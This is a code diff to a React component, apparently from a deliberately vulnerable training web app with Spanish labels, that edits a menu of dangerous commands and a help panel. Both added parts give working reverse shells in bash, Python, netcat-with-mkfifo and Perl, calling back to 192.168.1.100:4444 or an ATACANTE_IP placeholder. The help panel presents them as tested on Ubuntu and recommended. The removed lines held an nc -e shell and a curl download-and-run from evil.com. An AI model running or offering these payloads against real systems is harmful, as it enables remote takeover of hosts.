@@ -67,8 +67,10 @@ drwxr-xr-x  8 www-data www-data 4096 Sep 27 10:25 aplicaci-n-web-vulnerable-owas
         { label: '👥 Ver usuarios', cmd: 'cat /etc/passwd', danger: 'high' },
         { label: '🌐 Conexiones red', cmd: 'netstat -tulpn', danger: 'high' },
         { label: '⚡ Procesos activos', cmd: 'ps aux', danger: 'high' },
-        { label: '🚨 Reverse Shell', cmd: 'nc -e /bin/bash 192.168.1.100 4444', danger: 'critical' },
-        { label: '💀 Download Payload', cmd: 'curl -o /tmp/shell.py http://evil.com/shell.py && python /tmp/shell.py', danger: 'critical' }
+        { label: '🚨 Bash Reverse Shell', cmd: 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1', danger: 'critical' },
+        { label: '� Python Reverse Shell', cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'', danger: 'critical' },
+        { label: '🔧 Netcat sin -e', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.100 4444 >/tmp/f', danger: 'critical' },
+        { label: '💀 Perl Reverse Shell', cmd: 'perl -e \'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}\'', danger: 'critical' }
     ];
 
     const getDangerColor = (danger: string) => {
@@ -144,31 +146,35 @@ drwxr-xr-x  8 www-data www-data 4096 Sep 27 10:25 aplicaci-n-web-vulnerable-owas
                 )}
 
                 <div className="mt-6 p-4 bg-gray-800 rounded border border-gray-600">
-                    <h4 className="font-bold mb-2 text-red-300">🚨 Ejemplos de Reverse Shells:</h4>
+                    <h4 className="font-bold mb-2 text-red-300">🚨 Reverse Shells que FUNCIONAN en Ubuntu:</h4>
                     <div className="text-sm space-y-2">
                         <div className="p-2 bg-gray-900 rounded">
-                            <p className="text-yellow-300 font-semibold">Bash Reverse Shell:</p>
-                            <code className="text-green-300 font-mono text-xs">
+                            <p className="text-yellow-300 font-semibold">🔥 Bash Reverse Shell (RECOMENDADO):</p>
+                            <code className="text-green-300 font-mono text-xs block">
                                 bash -i &gt;&amp; /dev/tcp/ATACANTE_IP/4444 0&gt;&amp;1
                             </code>
                         </div>
                         <div className="p-2 bg-gray-900 rounded">
-                            <p className="text-yellow-300 font-semibold">Python Reverse Shell:</p>
-                            <code className="text-green-300 font-mono text-xs">
-                                python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATACANTE_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+                            <p className="text-yellow-300 font-semibold">🐍 Python3 Reverse Shell:</p>
+                            <code className="text-green-300 font-mono text-xs block">
+                                python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATACANTE_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
                             </code>
                         </div>
                         <div className="p-2 bg-gray-900 rounded">
-                            <p className="text-yellow-300 font-semibold">Netcat Reverse Shell:</p>
-                            <code className="text-green-300 font-mono text-xs">
-                                nc -e /bin/bash ATACANTE_IP 4444
+                            <p className="text-yellow-300 font-semibold">🔧 Netcat sin -e (Ubuntu compatible):</p>
+                            <code className="text-green-300 font-mono text-xs block">
+                                rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc ATACANTE_IP 4444 &gt;/tmp/f
                             </code>
                         </div>
                         <div className="p-2 bg-gray-900 rounded">
-                            <p className="text-yellow-300 font-semibold">Curl + Execute:</p>
-                            <code className="text-green-300 font-mono text-xs">
-                                curl http://ATACANTE_IP/shell.sh | bash
+                            <p className="text-yellow-300 font-semibold">💎 Perl Reverse Shell:</p>
+                            <code className="text-green-300 font-mono text-xs block">
+                                perl -e 'use Socket;$i="ATACANTE_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){"{"} open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");{"}"}'
                             </code>
+                        </div>
+                        <div className="p-2 bg-orange-900 rounded border border-orange-500">
+                            <p className="text-orange-300 font-semibold">⚠️ NOTA IMPORTANTE:</p>
+                            <p className="text-orange-200 text-xs">En Ubuntu, netcat no incluye -e por defecto. Usa las alternativas de arriba.</p>
                         </div>
                     </div>
                 </div>
